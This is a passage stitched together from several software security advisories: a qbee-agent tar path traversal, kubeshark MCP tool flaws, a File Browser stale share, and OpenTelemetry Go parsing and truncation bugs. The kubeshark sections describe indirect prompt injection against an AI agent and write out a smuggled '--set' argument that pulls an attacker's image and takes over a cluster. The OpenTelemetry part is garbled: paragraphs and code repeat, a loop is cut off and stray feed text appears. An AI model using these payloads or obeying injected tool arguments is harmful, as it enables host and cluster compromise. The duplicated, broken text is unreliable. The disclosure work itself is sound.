  2. Restrict Local Home Directory Alterations: Enforce strict file permissions or monitoring on managed user home directories to block unprivileged users from deleting or replacing ~/.ssh with a symbolic link.

  3. Enable Kernel Symlink Protection: Ensure that system-level symlink protections are active to mitigate the secondary /tmp vector by verifying that the following sysctl parameter is set to 1 (though note this does not fix the primary home directory vector):

sysctl -w fs.protected_symlinks=1

References

  • https://github.com/qbee-io/qbee-agent/security/advisories/GHSA-xhv5-8fpq-g7hf

Summary

qbee-agent contains a Zip Slip vulnerability in app/utils/tar.go. The tar extractor checks whether an entry remains inside the destination directory with:

strings.HasPrefix(targetPath, destdirClean)

This does not enforce a path separator boundary. If the destination directory is /tmp/.../context, a tar entry such as ../context-outside/payload.txt cleans to /tmp/.../context-outside/payload.txt and still passes the prefix check. qbee-agent then creates the outside directory and writes the payload outside the intended extraction root.

The issue is reachable through the Docker Compose build context path when UseContext is enabled.

Details

Code references below were verified against qbee-io/qbee-agent commit:

  • 1d8bdbb7422adb4ca563d3114cbe2817d6ba3581

Affected repository:

  • qbee-io/qbee-agent

Affected files:

  • app/utils/tar.go
  • Docker Compose context path in app/configuration/bundle_docker_compose.go

The vulnerable extraction code:

  • app/utils/tar.go:89-93
targetPath := filepath.Clean(filepath.Join(destPath, header.Name))
destdirClean := filepath.Clean(destPath)

if !strings.HasPrefix(targetPath, destdirClean) {
    return fmt.Errorf("tar entry %s is outside of destination directory %s", targetPath, destdirClean)
}

The file is then created at the accepted targetPath:

  • app/utils/tar.go:96-109
case tar.TypeDir:
    if err := os.MkdirAll(targetPath, 0755); err != nil {
        return err
    }
case tar.TypeReg:
    targetFile, err := os.Create(targetPath)

Docker Compose build contexts reach this extractor:

  • app/configuration/bundle_docker_compose.go:238-270

The context archive is downloaded and then unpacked into the compose project context directory with utils.UnpackTar.

Archive source and role evidence:

  • app/configuration/compose.go:14 defines the Docker Compose build context as the remote configuration field Context string.
  • app/configuration/compose.go:26 enables this path with UseContext.
  • app/configuration/file_manager.go:240-246 and app/configuration/file_manager.go:281-287 show that context sources are resolved either from file:// local files or from the Qbee file-manager API.
  • Qbee's Docker Compose documentation lists "Build Context" as a Docker Compose configuration option: https://docs.qbee.io/configuration-docker-compose.html
  • Qbee's RBAC documentation separates configuration:manage from files:manage, and maps "Configure -> Modify configuration" to configuration:manage while "Files manager -> Write access" maps to files:manage: https://docs.qbee.io/account-users-and-roles.html
  • Qbee's CI/CD documentation describes using a dedicated Qbee user with a role restricted to configuration changes to push and commit deployment configuration: https://docs.qbee.io/tutorial-iot-container-deployment-with-ci-cd-devops.html

Trust-boundary requirement:

  • The vulnerable primitive is clear: qbee-agent writes a regular file outside the intended context extraction directory.
  • The security boundary is present when the archive supplier is less privileged than the local qbee-agent process and is not supposed to write arbitrary sibling files in qbee-agent's Docker Compose cache/project area.
  • The public code and documentation support this boundary for tenants that delegate configuration and/or file-manager access to limited users or CI automation.
  • If a deployment allows only full device/fleet administrators to provide Docker Compose context archives, the finding should be treated as hardening for that deployment.

PoC

Two failing regression tests add.

The utility-level test proves the extractor bug directly:

  • app/utils/tar_test.go:132
  • Test_TarZipSlipSiblingPrefixBypass

Command:

wsl -e sh -lc 'cd /mnt/c/Users/kwak0/Documents/Qbee/targets/qbee-agent; /mnt/c/Users/kwak0/Documents/Qbee/.tools/go1.26.4-linux/go/bin/go test ./app/utils -run Test_TarZipSlipSiblingPrefixBypass -count=1 -v'

Observed result:

=== RUN   Test_TarZipSlipSiblingPrefixBypass
    tar_test.go:169: expected unpackTar to reject sibling-prefix traversal archive
    tar_test.go:174: path traversal: payload was written outside destPath at /tmp/.../context-outside/payload.txt; got "zip-slip-sibling-prefix"
--- FAIL: Test_TarZipSlipSiblingPrefixBypass (0.00s)
FAIL

The Docker Compose bundle-path test proves reachability through Compose.getContext():

  • app/configuration/bundle_docker_compose_context_zip_slip_test.go:13
  • Test_ComposeContextRejectsSiblingPrefixZipSlip

Command:

wsl -e sh -lc 'cd /mnt/c/Users/kwak0/Documents/Qbee/targets/qbee-agent; /mnt/c/Users/kwak0/Documents/Qbee/.tools/go1.26.4-linux/go/bin/go test ./app/configuration -run Test_ComposeContextRejectsSiblingPrefixZipSlip -count=1 -v'

Observed result:

=== RUN   Test_ComposeContextRejectsSiblingPrefixZipSlip
    bundle_docker_compose_context_zip_slip_test.go:66: expected compose context unpack to reject sibling-prefix traversal archive
    bundle_docker_compose_context_zip_slip_test.go:75: compose context path traversal wrote outside context dir at /tmp/.../cache/docker_compose/project-a/context-outside/payload.txt; got "compose-context-zip-slip"
--- FAIL: Test_ComposeContextRejectsSiblingPrefixZipSlip (0.00s)
FAIL

Impact

An attacker-controlled Docker Compose build context archive can create directories and regular files outside qbee-agent's intended context extraction directory, with qbee-agent process privileges.

The demonstrated impact is constrained path traversal:

  • It can write sibling-prefix paths such as cache/docker_compose/<project>/context-outside/payload.txt.
  • It does not demonstrate writing arbitrary paths such as /etc/passwd; those do not pass the current string-prefix check.
  • It can corrupt or alter files in nearby qbee-agent Docker Compose cache/project paths if their cleaned path shares the destination prefix.
  • It may affect integrity or availability of qbee-agent-managed Docker Compose state, depending on the project/cache layout.

This report does not claim direct RCE.

References

  • https://github.com/qbee-io/qbee-agent/security/advisories/GHSA-vx32-xf7g-9ghr
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129237
  • https://github.com/qbee-io/qbee-agent/pull/148
  • https://github.com/qbee-io/qbee-agent/commit/eb7875f0a849cb33325956d0b75e27061d7a7fa3
  • https://github.com/qbee-io/qbee-agent/releases/tag/2026.41
  • https://github.com/advisories/GHSA-vx32-xf7g-9ghr

Ecosystem / package: Go — github.com/kubeshark/kubeshark (the kubeshark CLI, kubeshark mcp subcommand) Affected component: cmd/mcpRunner.go, MCP tool download_file Affected versions: >= v53.1.0, < v53.4.0 (the flaw shipped with the tool's first release; v53.3.0 was the last affected release) Patched version: v53.4.0 Credit: novice-22 (Urim), via private coordinated disclosure.

Summary

The download_file MCP tool fetches a caller-supplied path from the Kubeshark Hub API and writes the response body to a caller-supplied dest on the local filesystem with no validation of dest. An attacker who can influence the MCP tool arguments — e.g. via indirect prompt injection against an AI agent driving kubeshark mcp — can write attacker-controlled bytes to an arbitrary path writable by the user running the MCP server (e.g. ~/.ssh/authorized_keys, ~/.kube/config, ~/.bashrc), and can request arbitrary Hub API endpoints. download_file is registered unconditionally (available in the default, non---allow-destructive posture).

Introduced in

Commit eb7dc42b — "Add get_file_url and download_file MCP tools (#1853)", 2026-03-04 — first released in v53.1.0 (v53.1.0~1). An earlier attempt (dbfd17d9) was reverted (a46f05c4) before any release, so no tag before v53.1.0 is affected.

Details

In callDownloadFile (cmd/mcpRunner.go), both path and dest come straight from the tool arguments:

  • dest was passed directly to os.Create(dest) with no confinement — no filepath.Clean, no base-directory containment, no rejection of absolute paths or ../ traversal. Any path the process can write is reachable.
  • path was concatenated onto the Hub API base URL with no allowlist, so any Hub endpoint (including captured-traffic exports) is reachable.

Auth context (CWE-306 / CWE-200)

The tool originally issued the fetch with no authentication. The authentication gap was addressed by the gated-Hub authentication refactor: the download now forwards the operator's Hub credentials (ServiceAccount token / License-Key) and rejects auth-required responses instead of writing a login page to disk. But the Hub ships auth-disabled by default (community/dev), so on a default kubeshark tap the Hub API answers without authentication and captured traffic (credentials/tokens/PII) can still be read and exfiltrated end-to-end. Enforcing Hub auth by default is tracked separately (gated-auth workstream) and is not part of this advisory's fix.

Proof of concept (reporter, abridged)

Following the tool's documented workflow on a default community install: export_snapshot_pcap → obtain a relative path → download_file with that path and an attacker-chosen dest. The reporter retrieved a captured-traffic PCAP and recovered a planted canary Authorization: Bearer … credential from it, and demonstrated writing the fetched bytes to an arbitrary local path.

Impact

  • Integrity (local): arbitrary file write on the machine running kubeshark mcp, as that user.
  • Confidentiality: read of Hub API endpoints, incl. captured network traffic (credentials, tokens, PII) on a default (auth-disabled) install.
  • Reliable RCE is not demonstrated (script endpoints are JSON-wrapped).

Severity rationale

Kubeshark scores this 5.3 Medium, down from the reporter's 7.1, on two metrics:

  • AV:N → AV:L. The vulnerable component has no network listener the attacker reaches. kubeshark mcp is a local stdio MCP server; the attacker's input arrives as content an agent running on that host ingests and then replays into a local tool call. The delivery of the poisoned content may cross a network, but the attack surface being exploited is local to the machine.
  • I:H → I:L. The write is confined to paths writable by the user running kubeshark mcp (normally unprivileged) — no system-file or other-user modification. The attacker also controls where the bytes land, not what they are: the body comes from a Hub API response, so the content is constrained to what the Hub will emit. Reliable RCE was not demonstrated.
  • A:L → A:N. Nothing in the issue degrades availability of the CLI, the Hub, or the host; the original A:L is unsupported.

Kubeshark kept C:H: on a default community install the Hub API answers unauthenticated, so captured traffic (credentials, tokens, PII) is genuinely readable end-to-end. Kubeshark kept AC:H (the attacker must land an injection in content the agent ingests and know the deployment layout), PR:N (download_file is registered unconditionally — no --allow-destructive needed), UI:R (an operator must be driving an agent against kubeshark mcp), and S:U (the impact stays within the local user's authorization scope).

Patches

Fixed in v53.4.0 by commit a76a1920 (PR #1957).

Changes in cmd/mcpRunner.go:

  • dest is resolved through secureDownloadDest and confined to a base directory (the CWD by default, relocatable via KUBESHARK_MCP_DOWNLOAD_DIR); a dest that resolves outside the base (via ../ or an absolute path) is rejected.
  • path is rejected if it contains .. segments.
  • Containment is re-checked after resolving symlinks, so a symlinked subdirectory inside the base (or a dest that is itself a symlink) cannot redirect the write outside it; the file is opened with O_NOFOLLOW where the platform provides it.
  • Credential forwarding + auth-required detection on the fetch (shipped in the gated-auth refactor).

Workarounds

  • Run kubeshark mcp as an unprivileged user in an isolated working directory.
  • Do not expose the MCP server to untrusted content / untrusted agent inputs.
  • Enable Hub authentication (AUTH_ENABLED=true + an IdP/license) to close the unauthenticated read path.

Follow-ups (not blocking this advisory)

  • Strict prefix allowlist for the Hub path (current fix only rejects ..).
  • Hub-side default auth enforcement (gated-auth workstream).

References

  • https://github.com/kubeshark/kubeshark/security/advisories/GHSA-gj7r-p794-hhq5
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129235
  • https://github.com/kubeshark/kubeshark/pull/1957
  • https://github.com/kubeshark/kubeshark/commit/a76a1920dc7587be700a17f1592f58a9512ad214
  • https://github.com/kubeshark/kubeshark/releases/tag/v53.4.0
  • https://github.com/advisories/GHSA-gj7r-p794-hhq5

Ecosystem / package: Go — github.com/kubeshark/kubeshark (the kubeshark CLI, kubeshark mcp subcommand) Affected component: cmd/mcpRunner.go, MCP tool start_kubeshark Affected versions: >= v53.1.0, < v53.4.0 (the flaw shipped with the MCP command's first release; v53.3.0 was the last affected release) Patched version: v53.4.0 Credit: novice-22 (Urim), via private coordinated disclosure.

Summary

The start_kubeshark MCP tool builds a kubeshark tap command by appending the caller-supplied pod_regex as a bare positional argument, with no -- end-of-options separator. Because tap is a cobra command, a pod_regex that begins with -/--set= is parsed as a flag, not as the pod regex. An attacker who can influence the tool arguments (e.g. indirect prompt injection against an agent driving kubeshark mcp --allow-destructive) can inject arbitrary --set Helm value overrides — notably tap.docker.registry / tap.docker.tag — redirecting the deployed worker/hub/front images to an attacker-controlled registry. The worker DaemonSet runs privileged with hostNetwork and the host filesystem mounted, so an attacker image yields node and cluster-admin compromise.

Introduced in

Commit 0bbbb473 — "[1] Add MCP (Model Context Protocol) server command (#1832)", 2026-02-06 — first released in v53.1.0 (v53.1.0~23). The pod_regex argument has been appended as a bare positional since the tool's introduction; there is no regression window, every MCP-capable release is affected.

Details

In callStartKubeshark (cmd/mcpRunner.go), the command was built as ["tap", <pod_regex>, "-n", …, "--set", …, "--set", "headless=true"] with pod_regex inserted as a raw element. cobra parses flags positionally-agnostic and there was no -- guard, so pod_regex="--set=tap.docker.registry=…,tap.docker.tag=…" became a real --set. The tool is only registered when kubeshark mcp --allow-destructive is set.

Proof of concept (reporter, abridged)

Driving kubeshark mcp --allow-destructive: start_kubeshark with pod_regex="--set=tap.docker.registry=<attacker>,tap.docker.tag=<tag>" caused the CLI to construct kubeshark tap --set=… --set headless=true, deploying an attacker image. The image ran as root inside the privileged worker container and read the host's cluster-admin kubeconfigs (/etc/kubernetes/super-admin.conf, admin.conf, pki/) — i.e. cluster-admin takeover from a single pod_regex value.

Impact

Full Kubernetes cluster compromise (cluster-admin) from a single injected tool argument, when the operator runs the MCP server with --allow-destructive.

Severity rationale

Kubeshark scores this 7.2 High, down from the reporter's 8.3, on two metrics. The impact half of the vector (S:C/C:H/I:H/A:H) is unchanged — cluster-admin takeover is real and Kubeshark does not contest it.

  • AV:N → AV:L. kubeshark mcp is a local stdio MCP server with no network listener. The attacker's payload reaches it as content an agent running on that host ingested and replayed into a local tool call. The poisoned content may have travelled over a network, but the exploited interface is local.
  • PR:N → PR:H. Two administrative preconditions must already hold on the target host: the operator must have started the MCP server with the explicit, non-default --allow-destructive flag (without it start_kubeshark is not registered at all), and that host must already hold a kubeconfig with permission to deploy the privileged Kubeshark DaemonSet. Kubeshark kept AC:H (the injection must land in content the agent ingests, and the attacker must stand up a malicious registry/image), UI:R (an operator must be actively driving the agent), and S:C (the compromise crosses from the CLI's authorization scope into the Kubernetes cluster — this is what keeps the score in the High band).

In cmd/mcpRunner.go: pod_regex is now appended last, after a literal -- end-of-options separator, so it is always parsed as the [POD REGEX] positional and can never be interpreted as a flag. (namespaces / release_namespace are passed through -n / -s value flags, which consume their value token and are therefore not injectable.)

Workarounds

  • Do not run kubeshark mcp with --allow-destructive unless required.
  • Do not expose the MCP server to untrusted content / untrusted agent inputs.
  • Restrict the kubeconfig/permissions available to the machine running the MCP server.

Summary

File Browser v2.63.15 can leave a public directory share behind when the shared directory is deleted through a path with a trailing slash. The share cleanup path calls DeleteWithPathPrefix(file.Path, userID), but the Bolt backend performs the database prefix query with the unnormalized argument before trimming the slash for boundary checks. For a stored share at /a, deleting /a/ queries for paths prefixed by /a/, so the exact /a share is never loaded and never deleted.

If a directory with the same path is later recreated, the stale public share becomes active again and exposes the new directory contents through the old public URL.

Impact

An authenticated user with share, download, and delete permissions can create a valid public share, delete the shared path with a trailing slash, and leave the public link in storage. The link is dormant while the path does not exist, but it exposes future content if the same path is recreated later. The final data exposure is unauthenticated through the public share URL.

This bypasses the intended lifecycle cleanup around public shares and is adjacent to the recent public-share path-existence and prefix-boundary fixes.

Reproduction

The following test was run against v2.63.15, commit be23ab3a15bf957928ecfed88de5ab67850c1b9c.

  1. Create a scoped user with share, download, and delete permissions.
  2. Create /a/old.txt in that user's scope.
  3. Store a valid public share row with Hash: "h", UserID: 1, and Path: "/a".
  4. Send an authenticated delete request for /a/ through the resource delete handler.
  5. Confirm the directory is deleted.
  6. Confirm share hash h still exists in storage.
  7. Recreate /a/future.txt.
  8. Request the public share handler at h/ and observe that the unauthenticated response includes future.txt.

Command used for the local proof:

go test ./http -run TestValidationTrailingSlashDeleteLeavesExactDirectoryShare -count=1 -v

Observed result:

=== RUN   TestValidationTrailingSlashDeleteLeavesExactDirectoryShare
--- PASS: TestValidationTrailingSlashDeleteLeavesExactDirectoryShare (0.03s)
PASS
ok  github.com/filebrowser/filebrowser/v2/http  0.044s

Root cause

storage/bolt/share.go queries the share index before normalizing the path:

func (s shareBackend) DeleteWithPathPrefix(pathPrefix string, userID uint) error {
    var links []share.Link
    if err := s.db.Prefix("Path", pathPrefix, &links); err != nil {
        ...
    }

    prefix := strings.TrimRight(pathPrefix, "/")

    for _, link := range links {
        if link.UserID != userID {
            continue
        }

        if link.Path != prefix && !strings.HasPrefix(link.Path, prefix+"/") {
            continue
        }
        ...
    }
}

For pathPrefix == "/a/", the database prefix query can return descendants such as /a/child, but it does not return the exact share path /a. The later TrimRight cannot delete the exact share because that row was not loaded from storage.

http/resource.go passes the request-derived path into this cleanup before removing the resource:

file, err := files.NewFileInfo(... Path: r.URL.Path ...)
...
err = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID)
...
return d.user.Fs.RemoveAll(r.URL.Path)

A request for /a/ therefore removes the directory but misses the exact /a share row.

Remediation

Normalize the path before querying the share index, and cover both the exact normalized path and its descendants. Add regression tests where a stored share path /a is removed by DeleteWithPathPrefix("/a/", userID) and where DELETE /api/resources/a/ deletes the exact public share row.

Fixed in version 2.63.17.

Summary

OpenTelemetry Go eagerly materializes W3C baggage metadata into property objects during parsing. Slice growth, serialization, and copying into the internal representation cause bounded but disproportionate memory-allocation amplification for a valid, densely populated header. In v1.46.0 and v1.47.0-rc.1, the 8,192-byte raw-input limit is checked before member parsing; this is not unlimited allocation or a bypass of that limit.

A valid 8,191-byte value containing one member and 4,094 properties causes approximately 778 KB of cumulative allocation per parse. A corrected measurement with forced garbage collection before and after parsing retains approximately 164 KB per result while it remains live. These are different metrics: approximately 95 times the input in allocation traffic versus approximately 20 times in incremental live heap in the measured environment.

The relevant security configuration is a service that enables Baggage propagation and extracts attacker-controlled inbound context before authentication or on a public route. Concurrent or sustained requests can increase allocation and GC pressure. The evidence establishes allocation amplification, but does not establish reliable OOM, process termination, or complete denial of service.

This is a pre-existing, independent allocation-amplification path not addressed by GHSA-5wrp-cwcj-q835 / CVE-2026-41178. It predates that advisory; it is not described as having been introduced by its fix.

Affected module, versions, and symbols

  • Go module: go.opentelemetry.io/otel.
  • Import paths and entry points: go.opentelemetry.io/otel/baggage.Parse and go.opentelemetry.io/otel/propagation.Baggage.Extract.
  • Implementation: parseMember, property-slice growth and serialization, and conversion into internal/baggage.Item.
  • Source history places the eager-property implementation at commit 4bf6150fa94e18bdf01c96ed78ee6d1c76f8e308, first included in v1.0.0-RC1; the stable release line starts at v1.0.0.
  • Affected release range: >= 1.0.0-RC1, < 1.47.0.
  • Patched release: v1.47.0 (https://github.com/open-telemetry/opentelemetry-go/pull/9024), which validates and normalizes W3C property metadata in place during Parse and materializes Property structs lazily only when Member.Properties() is explicitly called.
  • Small parser measurements were run on v1.0.0-RC1, v1.0.0, v1.46.0, and v1.47.0-rc.1; this is not a claim to have dynamically tested every intervening release. The v1.46.0 and v1.47.0-rc.1 parser source is identical to the inspected main commit 901e812ec023f45f791cd4d49cfbbef353ae21ae.

Early releases have a 4,096-byte per-member limit. They reproduce the same mechanism with a 4,095-byte member containing 2,046 properties; the 8,191-byte single-member input is rejected there. The 8 KB example and its numerical allocation result must not be projected onto every historical version.

Root cause and input bounds

For the valid dense input, each short property becomes a Go Property, and the slice grows as parsing proceeds. The parser subsequently serializes the member and copies its properties into the internal representation. A two-byte wire fragment can therefore produce substantially more than two bytes of allocation work. Temporary parser objects and internal retained objects must not be added together and described as permanently retained memory.

In the currently measured parser, the raw 8,192-byte limit and 64-member limit still apply. The number of accepted properties is consequently bounded by input length even though there is no separate property-count guard. Eager representation and copying are the defect described here; the absence of an arbitrary count cap is not, by itself, the defect.

The primary input is constructed as "k=v" + strings.Repeat(";a", 4094) (8,191 bytes); the equal-size value-only control is "k=" + strings.Repeat("v", 8189). Call baggage.Parse once for each measured result. To verify the property count separately, inspect bag.Members()[0].Properties() outside the measured interval; this accessor itself allocates. The primary example remains the valid 8,191-byte, 4,094-property input already supplied in this private report. Empty-property input discussed in the maintainer review is malformed and is supplementary parser-hardening evidence, not the standards-compliant primary example or the basis of the severity score.

HTTP reachability and authentication ordering

The Go global propagator is initially a no-op. Installing the library alone does not expose this path. Baggage must be enabled explicitly or by applicable auto-configuration; standardized auto-configuration defaults do not establish an individual application's configuration.

An ordinary HTTP composition can place otelhttp.NewHandler outside the authentication handler. With propagation.Baggage{} enabled and the request not excluded by a filter, the checked otelhttp implementation calls h.propagators.Extract(r.Context(), propagation.HeaderCarrier(r.Header)) before next.ServeHTTP. Authentication inside next therefore runs after extraction, including for a request that is ultimately rejected with 401/403. Reversing the composition so authentication rejects before entering otelhttp prevents this unauthenticated extraction path. This is a source-level ordering check of a normal integration, not a claim about all services or an executed HTTP benchmark.

Source checked: otelhttp handler at ce138eb092f223e4e41e0420c58fc34910bc2b56, extraction at line 98 and downstream handler at line 185. A filter that bypasses instrumentation takes a separate path and is outside this stated composition.

Remote reachability requires all of the following: Baggage extraction is enabled; attacker-controlled input reaches it; the transport and proxy accept the relevant header size; and extraction runs before authentication or on a public route. Material service impact further depends on request rate, concurrency, request lifetime, GC behavior, and resource limits. Authentication is a mitigation only if it precedes extraction. A path that requires a properly authenticated triggering client must also be evaluated under the project's authenticated-client DoS exclusion.

References

  • https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-rrfc-gjm9-cgrj
  • https://github.com/open-telemetry/opentelemetry-go/pull/9024
  • https://github.com/open-telemetry/opentelemetry-go/commit/f09d1de32f4ac7e5ef16394533721106b1a57b89

items.content_html:
Summary

The AttributeValueLengthLimit span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit e016a78c9, first released in v1.33.0) has an "optimistic" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in go.opentelemetry.io/otel/sdk/trace (sdk/internal/attrnorm), go.opentelemetry.io/otel/sdk/log (sdk/log/internal/attrnorm), and the auto-instrumentation tracer in go.opentelemetry.io/otel/trace (trace/auto.go, introduced in v1.35.0).

This is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.

Details

The shared truncation helper is generated from internal/shared/attrnorm/truncate.go.tmpl. In the v1.46.0 release, the generated copies are sdk/internal/attrnorm/truncate.go and sdk/log/internal/attrnorm/truncate.go (identical logic, different package names). The optimistic path (v1.46.0, sdk/internal/attrnorm/truncate.go:175-199) is:

// Optimistically, assume all valid UTF-8.
var b strings.Builder
count := 0
for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}

range over a string yields utf8.RuneError both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

  1. A value made only of valid U+FFFD runes never increments count, so no truncation ever triggers and the value is returned unchanged, whatever its length.
  2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final return s[:i] keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by limit.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

  • trace: span.SetAttributes -> sdk/trace/span.go (normAttr) -> attrnorm.Truncate -> sdk/internal/attrnorm/truncate.go (truncate)
  • log: Record.AddAttributes / SetAttributes -> sdk/log/record.go (attrnorm.TruncateValue) -> sdk/log/internal/attrnorm/truncate.go (truncate)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (safeTruncateValidUTF8), which gave up truncating entirely for strings containing RuneError. The rewrite in e016a78c9 replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares go 1.25.0; any recent toolchain auto-selects one).

Create a directory with these files.

go.mod (then run go mod tidy once to fill go.sum):

module otelpoc

go 1.25.0

require (
    go.opentelemetry.io/otel v1.46.0
    go.opentelemetry.io/otel/log v0.22.0
    go.opentelemetry.io/otel/sdk v1.46.0
    go.opentelemetry.io/otel/sdk/log v0.22.0
    go.opentelemetry.io/otel/trace v1.46.0
)

otelgo_truncate_test.go:

package otelpoc

import (
    "context"
    "strings"
    "testing"
    "unicode/utf8"

    "go.opentelemetry.io/otel/attribute"
    sdktrace "go.opentelemetry.io/otel/sdk/trace"
    "go.opentelemetry.io/otel/sdk/trace/tracetest"
    "go.opentelemetry.io/otel/trace"
)

// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and
// everything else unlimited, isolating the length-limit enforcement under test.
func limitsWithLen(limit int) sdktrace.SpanLimits {
    lim := sdktrace.NewSpanLimits()
    lim.AttributeValueLengthLimit = limit
    lim.AttributeCountLimit = -1
    lim.AttributePerEventCountLimit = -1
    lim.AttributePerLinkCountLimit = -1
    lim.EventCountLimit = -1
    lim.LinkCountLimit = -1
    return lim
}

func captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {
    t.Helper()
    sr := tracetest.NewSpanRecorder()
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithSpanProcessor(sr),
        sdktrace.WithSpanLimits(limitsWithLen(limit)),
    )
    defer func() { _ = tp.Shutdown(context.Background()) }()

    tr := tp.Tracer("poc")
    _, span := tr.Start(context.Background(), "op")
    span.SetAttributes(attrs...)
    span.End()

    ended := sr.Ended()
    if len(ended) != 1 {
        t.Fatalf("expected 1 ended span, got %d", len(ended))
    }
    return ended[0].Attributes()
}

// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string
// attribute composed of valid U+FFFD runes is stored completely untruncated
// although AttributeValueLengthLimit=5.
func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    if len(got) != 1 {
        t.Fatalf("expected 1 attribute, got %d", len(got))
    }
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),
        utf8.RuneCountInString(stored), len(stored), limit)
    // Per OTel spec ("counting any character in it as 1") the stored value
    // must be at most `limit` characters (<= 15 bytes for U+FFFD).
    if maxBytes := 3 * limit; len(stored) > maxBytes {
        t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
            limit, len(stored), maxBytes)
    }
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
    const limit = 5
    val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

    got := captureOneSpan(t, limit, attribute.String("k", val))
    stored := got[0].Value.AsString()
    t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
        utf8.RuneCountInString(val), len(val),

A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). // Optimistically, assume all valid UTF-8.

for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]

        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}

range over a string yields utf8.RuneError both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

  1. A value made only of valid U+FFFD runes never increments count, so no truncation ever triggers and the value is returned unchanged, whatever its length.
  2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final return s[:i] keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by limit.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

  • trace: span.SetAttributes -> sdk/trace/span.go (normAttr) -> attrnorm.Truncate -> sdk/internal/attrnorm/truncate.go (truncate)
  • log: Record.AddAttributes / SetAttributes -> sdk/log/record.go (attrnorm.TruncateValue) -> sdk/log/internal/attrnorm/truncate.go (truncate)

        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}

range over a string yields utf8.RuneError both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

  1. A value made only of valid U+FFFD runes never increments count, so no truncation ever triggers and the value is returned unchanged, whatever its length.
  2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final return s[:i] keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by limit.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

  • trace: span.SetAttributes -> sdk/trace/span.go (normAttr) -> attrnorm.Truncate -> sdk/internal/attrnorm/truncate.go (truncate)
  • log: Record.AddAttributes / SetAttributes -> sdk/log/record.go (attrnorm.TruncateValue) -> sdk/log/internal/attrnorm/truncate.go (truncate)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (safeTruncateValidUTF8), which gave up truncating entirely for strings containing RuneError. The rewrite in e016a78c9 replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares go 1.25.0; any recent toolchain auto-selects one).

Create a directory with these files.

go.mod (then run go mod tidy once to fill go.sum):

go 1.25.0

    go.opentelemetry.io/otel v1.46.0
    go.opentelemetry.io/otel/log v0.22.0
    go.opentelemetry.io/otel/sdk v1.46.0
